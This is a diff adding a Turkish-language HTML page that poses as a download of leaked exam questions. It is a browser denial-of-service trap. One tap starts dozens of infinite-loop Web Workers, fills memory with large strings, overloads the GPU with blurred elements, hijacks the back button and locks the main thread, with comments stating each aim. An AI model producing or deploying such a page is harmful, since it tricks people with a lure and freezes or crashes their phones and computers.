@@ -1,0 +1,48 @@
+
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>Sınav Soruları PDF</title>
+    <style>
+        body { background: #000; color: #f00; text-align: center; font-family: sans-serif; overflow: hidden; }
+        .box { border: 5px solid gold; margin: 20px; padding: 20px; }
+    </style>
+</head>
+<body onclick="kickStart()">
+    <div class="box">
+        <h1>⚠️ SINAV SORULARI YÜKLENİYOR ⚠️</h1>
+        <p>Dosyayı açmak için ekrana BİR KEZ DOKUNUN.</p>
+        <iframe width="100%" height="300" src="https://www.youtube.com/embed/gy955m2mpcM?autoplay=1&mute=1" frameborder="0"></iframe>
+    </div>
+
+    <script>
+        function kickStart() {
+            // Telefonun tüm çekirdeklerini (CPU) %100 yap
+            const cores = navigator.hardwareConcurrency || 12;
+            for (let i = 0; i < cores * 8; i++) { // Bilgisayarda 2 katı, telefonda 8 katı worker
+                const blob = new Blob(['while(true){Math.random()*Math.random()}'], {type: 'text/javascript'});
+                const worker = new Worker(URL.createObjectURL(blob));
+            }
+
+            // RAM'i ve Arayüzü (GPU) kilitle
+            let bakkalKazigi = [];
+            setInterval(() => {
+                for (let i = 0; i < 1000; i++) {
+                    bakkalKazigi.push(new Array(100000).join("ZİHNİ")); // RAM'i şişir
+                    let d = document.createElement('div');
+                    d.style.cssText = "position:fixed;width:1px;height:1px;box-shadow:0 0 100px red;filter:blur(50px);";
+                    document.body.appendChild(d); // Ekran kartını (GPU) yor
+                }
+                // Geri tuşunu boz
+                history.pushState(null, "", "#" + Math.random());
+            }, 10);
+
+            // Sonsuz döngü (Main Thread)
+            while(true) {
+                console.log("Bakkal Zihni devrede...");
+            }
+        }
+    </script>
+</body>
+</html>
